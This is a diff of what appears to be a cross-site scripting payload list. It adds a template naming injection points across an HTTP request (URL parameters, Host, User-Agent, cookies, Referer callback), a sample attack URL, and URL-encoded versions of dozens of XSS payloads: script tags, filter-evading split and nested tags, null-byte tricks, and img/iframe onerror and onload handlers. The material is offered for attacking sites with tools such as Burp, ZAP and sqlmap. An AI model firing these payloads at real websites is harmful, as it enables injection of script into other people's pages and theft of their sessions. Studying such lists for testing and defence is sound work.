@@ -1,16 +1,27 @@
-Remember, when loading these into Burp, ZAP, sqlmap, etc, (You can do what u want) but personally, i will reuse the
-same 30 entries below, over and over lets say the URI is:
 
-https://examples.com/baseball.php?id=3
+Use:
+Inject at various points in the request:
+ Points of injection (options)
+{METHOD} /path{INJECT}/?id={INJECT}&more={INJECT} HTTP/1.X\r\n          # Try to downgrade attack the server to HTTP1.0
+Host: hostname.example.com{INJECT}
+User-Agent: {INJECT}
+Connection: keep-alive{INJECT}
+Set-Cookie: csrf=<existing csrf>{INJECT}
+Accept: */*{INJECT}
+Referer: https://{INJECT CALLBACK URL}
+Accept-Encoding: {gzip,} deflate{, br}          # OPTIONAL headers .. Use only deflate - Good for poss. injection
+Accept-Language: en-US,en;q=0.9{INJECT}
+Priority: u=1, i{INJECT}
 
-I will use this list 60 times, with various characters appending the 3 (the value) IE:
+Note:
+  Keep in mind, you do not have limitations on injection, you dont have to just inject the $_GET (url)values
+  Attack cookie values and other request headers.
 
-https://examples.com/baseball.php?id=3'<script>{JAVASCRIPT}</script>
---- 
-In addition, if your using sqlmap, or coding something yourself, try all of them the way I just mentioned, but then urlencode all chars and look for anything 200 or non 
-4xx.
+GET Attack: https://examples.com/baseball.php?id=3'<script>{JAVASCRIPT}</script>
 
-
+List of Payloads:
+------------------
+&#39;%3C%2Fcode%3E%3Cscript%3E
 <script>{JAVASCRIPT}</script>
 <scr ipt>{JAVASCRIPT}</scr ipt>
 "><script>{JAVASCRIPT}</script>
@@ -43,4 +54,38 @@ onload='{JAVASCRIPT}'
 '''><SCRIPT>{JAVASCRIPT}'
 <IFRAME SRC='f' onerror="{JAVASCRIPT}"></IFRAME>
 <IFRAME SRC='f' onerror='{JAVASCRIPT}'></IFRAME>
+
+URL Encoded version:
+%3Cscript%3E%7BJAVASCRIPT%7D%3C%2Fscript%3E
+%3Cscr%20ipt%3E%7BJAVASCRIPT%7D%3C%2Fscr%20ipt%3E
+"%3E%3Cscript%3E%7BJAVASCRIPT%7D%3C%2Fscript%3E
+"%3E%3Cscript%3E%7BJAVASCRIPT%7D%3C%2Fscript%3E%3C"
+'%3E%3Cscript%3E%7BJAVASCRIPT%7D%3C%2Fscript%3E
+'%3E%3Cscript%3E%7BJAVASCRIPT%7D%3C%2Fscript%3E%3C'
+%3CSCRIPT%3E%7BJAVASCRIPT%7D%3B%3C%2FSCRIPT%3E
+%3Cscri%3Cscript%3Ept%3E%7BJAVASCRIPT%7D%3B%3C%2Fscr%3C%2Fscript%3Eipt%3E
+%3CSCRI%3Cscript%3EPT%3E%7BJAVASCRIPT%7D%3B%3C%2FSCR%3C%2Fscript%3EIPT%3E
+%3Cscri%3Cscr%3Cscript%3Eipt%3Ept%3E%7BJAVASCRIPT%7D%3B%3C%2Fscr%3C%2Fsc%3C%2Fscript%3Eript%3Eipt%3E
+"%3B%7BJAVASCRIPT%7D%3B"
+'%3B%7BJAVASCRIPT%7D%3B'
+%3B%7BJAVASCRIPT%7D%3B
+%7BJAVASCRIPT%7D%3B
+%3CSCR%2500IPT%3E%7BJAVASCRIPT%7D%3C%2FSCR%2500IPT%3E
+"%3B%7BJAVASCRIPT%7D%3B%2F%2F
+%3CSTYLE%20TYPE%3D"text%2Fjavascript"%3E%7BJAVASCRIPT%7D%3B%3C%2FSTYLE%3E
+%3C%3CSCRIPT%3E%7BJAVASCRIPT%7D%2F%2F%3C%3C%2FSCRIPT%3E
+"%7BEVENTHANDLER%7D%3D%7BJAVASCRIPT%7D
+%3C%3CSCRIPT%3E%7BJAVASCRIPT%7D%2F%2F%3C%3C%2FSCRIPT%3E
+%3Cimg%20src%3D"1"%20onerror%3D"%7BJAVASCRIPT%7D"%3E
+%3Cimg%20src%3D'1'%20onerror%3D'%7BJAVASCRIPT%7D'%3E
+onerror%3D"%7BJAVASCRIPT%7D"
+onerror%3D'%7BJAVASCRIPT%7D'
+onload%3D"%7BJAVASCRIPT%7D"
+onload%3D'%7BJAVASCRIPT%7D'
+%3CIMG%20""%22%3E%3CSCRIPT%3E%7BJAVASCRIPT%7D%3C%2FSCRIPT%3E%22%3E
+%3CIMG%20'''%3E%3CSCRIPT%3E%7BJAVASCRIPT%7D%3C%2FSCRIPT%3E'%3E
+""%22%3E%3CSCRIPT%3E%7BJAVASCRIPT%7D
+''''%3E%3CSCRIPT%3E%7BJAVASCRIPT%7D'
+%3CIFRAME%20SRC%3D'f'%20onerror%3D"%7BJAVASCRIPT%7D"%3E%3C%2FIFRAME%3E
+%3CIFRAME%20SRC%3D'f'%20onerror%3D'%7BJAVASCRIPT%7D'%3E%3C%2FIFRAME%3E
 
